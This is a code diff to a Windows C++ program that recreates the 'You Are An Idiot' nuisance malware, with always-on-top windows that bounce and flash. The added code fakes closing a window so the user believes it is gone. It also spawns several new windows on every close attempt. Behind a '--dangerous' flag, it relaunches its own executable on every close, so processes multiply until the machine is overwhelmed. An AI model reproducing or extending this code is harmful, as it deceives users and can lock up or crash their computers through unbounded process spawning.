@@ -34,8 +34,8 @@
 
 // C RunTime Header Files
 #include <math.h>
-#include <time.h>
 
+//constants
 #define WINDOW_WIDTH 300
 #define WINDOW_HEIGHT 225
 #define FLASH_TICKS 25
@@ -45,10 +45,11 @@
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
 void    CALLBACK WindowTimerProc(HWND hWnd, UINT message, UINT_PTR nTimerID, DWORD nMillis);
 
+//global variables
 HIMAGELIST himlIdiot;
+bool createSeparateProcesses = false;
 
-class IdiotWindow{
-public:
+struct IdiotWindow{
 	int offsetX = 5;
 	int offsetY = 5;
 	bool black = false;
@@ -68,7 +69,7 @@ IdiotWindow::IdiotWindow(bool firstRun):firstRun(firstRun){
 	RECT size = {0, 0, WINDOW_WIDTH, WINDOW_HEIGHT};
 	AdjustWindowRect(&size, dwStyle, FALSE);
 
-	hWnd = CreateWindowExW(0,
+	hWnd = CreateWindowExW(WS_EX_TOPMOST,
 		L"IdiotWindowClass",
 		L"You Are An Idiot",
 		dwStyle,
@@ -81,7 +82,6 @@ IdiotWindow::IdiotWindow(bool firstRun):firstRun(firstRun){
 		hInst,
 		NULL
 	);
-
 	if(!hWnd){
 		throw;
 	}
@@ -106,31 +106,23 @@ INT IdiotWindow::Draw(){
 
 INT APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow){
 	UNREFERENCED_PARAMETER(hPrevInstance);
-	UNREFERENCED_PARAMETER(lpCmdLine);
 
-	//InitCommonControls();
-	//wprintf(L"hello, %s", lpCmdLine);
-	//int num = 0;
-	//LPWSTR* t = CommandLineToArgvW(lpCmdLine, &num);
-	//for(int i = 0; i < num; i++){
-	//	MessageBoxW(nullptr, t[i], L"hello", 0);
-	//}
-	//
-	//return 0;
+	int num = 0;
+	LPWSTR* t = CommandLineToArgvW(lpCmdLine, &num);
+	if(num && !wcscmp(t[0], L"--dangerous")){
+		createSeparateProcesses = true;
+	}
 
 	// Specify seed for rand() functions
-	srand((UINT)time(0));
+	LARGE_INTEGER seed;
+	QueryPerformanceCounter(&seed);
+	srand(seed.QuadPart);
 
 	// Register window class
 	WNDCLASSEXW wcex = {0};
 	wcex.cbSize = sizeof(WNDCLASSEXW);
-	//wcex.style = CS_HREDRAW | CS_VREDRAW;
 	wcex.lpfnWndProc = WndProc;
 	wcex.hInstance = hInstance;
-	//wcex.hIcon = LoadIconW(hInstance, MAKEINTRESOURCEW(IDI_IDIOT));
-	//wcex.hIconSm = wcex.hIcon;
-	//wcex.hCursor = LoadCursorW(NULL, IDC_ARROW);
-	//wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
 	wcex.lpszClassName = L"IdiotWindowClass";
 	RegisterClassExW(&wcex);
 
@@ -165,23 +157,6 @@ INT newPositive(){
 	return ((int)ceil((7.0 * ((double)(rand()) / 32768.0)))) * 5 - 10;
 }
 
-//HINSTANCE WINAPI startWindow(HWND hWnd){
-//	//new IdiotWindow(hInst, );
-//	//Sleep(rand() % 500);
-//	
-//	//PlaySoundW(MAKEINTRESOURCEW(IDR_IDIOT), GetModuleHandle(nullptr), SND_LOOP | SND_RESOURCE | SND_SYNC | SND_NOSTOP);
-//
-//	//system("wscript /b playsound.vbs");
-//	//WinExec("wscript /b playsound.vbs", SW_NORMAL);
-//	return ShellExecuteW(hWnd, L"open", L"wscript.exe", L"..\\debug\\playsound.vbs", nullptr, SW_NORMAL);
-//
-//
-//	//WaitForSingleObject(wnd->hWnd, 30000);
-//	//Sleep(10000);
-//	//return 0;
-//}
-
-
 // Window procedure
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam){
 	IdiotWindow* WindowPtr = (IdiotWindow*)GetPropW(hWnd, L"ClassPointer");
@@ -189,22 +164,30 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam){
 		case WM_PAINT:
 			return WindowPtr->Draw();
 		case WM_CLOSE:
+			if(WindowPtr->firstRun){
+				DestroyWindow(WindowPtr->hWnd);
+				//ShowWindow(WindowPtr->hWnd, SW_SHOWNORMAL);
+				WindowPtr->firstRun = false;
+				//make user think window was closed
+				Sleep(2000);
+			}
 			// On close open new 4 windows
 			for(int i = 0; i < SPAWN_NEW_WINDOWS; i++){
-				//new IdiotWindow((HINSTANCE)CreateThread(nullptr, 0, IdiotWindow::IdiotWindow, 0, 0, 0));
-				
-				//CreateThread(nullptr, 0, startWindow, 0, 0, nullptr);
-				IdiotWindow* wnd = new IdiotWindow();
-				//startWindow(wnd->hWnd);
-			}
-			if(WindowPtr->firstRun){
-				//DestroyWindow(WindowPtr->hWnd);
-				ShowWindow(WindowPtr->hWnd, SW_SHOWNORMAL);
-				WindowPtr->firstRun = false;
+				if(createSeparateProcesses){
+					WCHAR currentFile[MAX_PATH];
+					GetModuleFileNameW(nullptr, currentFile, MAX_PATH);
+					ShellExecuteW(hWnd, L"open", currentFile, L"--dangerous", nullptr, SW_SHOWNORMAL);
+					Sleep(500);
+				}
+				else{
+					IdiotWindow* wnd = new IdiotWindow();
+				}
 			}
 			return 0;
 		case WM_DESTROY:
-			//PostQuitMessage(0);
+			if(createSeparateProcesses){
+				PostQuitMessage(0);
+			}
 			break;
 	}
 	return DefWindowProcW(hWnd, message, wParam, lParam);
@@ -215,7 +198,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam){
 void CALLBACK WindowTimerProc(HWND hWnd, UINT message, UINT_PTR nTimerID, DWORD nMillis){
 
 	IdiotWindow* WindowPtr = (IdiotWindow*)nTimerID;
-	if(!WindowPtr->firstRun){
+	if(!WindowPtr->firstRun || createSeparateProcesses){
 		//get current window position
 		RECT windowRect;
 		GetWindowRect(hWnd, &windowRect);
@@ -241,7 +224,6 @@ void CALLBACK WindowTimerProc(HWND hWnd, UINT message, UINT_PTR nTimerID, DWORD 
 		windowRect.left += WindowPtr->offsetX;
 		windowRect.top += WindowPtr->offsetY;
 
-		//move window
 		MoveWindow(hWnd, windowRect.left, windowRect.top, wWidth, wHeight, FALSE);
 	}
 
@@ -251,6 +233,4 @@ void CALLBACK WindowTimerProc(HWND hWnd, UINT message, UINT_PTR nTimerID, DWORD 
 		WindowPtr->black = !WindowPtr->black;
 		InvalidateRect(WindowPtr->hWnd, nullptr, TRUE);
 	}
-
-	
 }
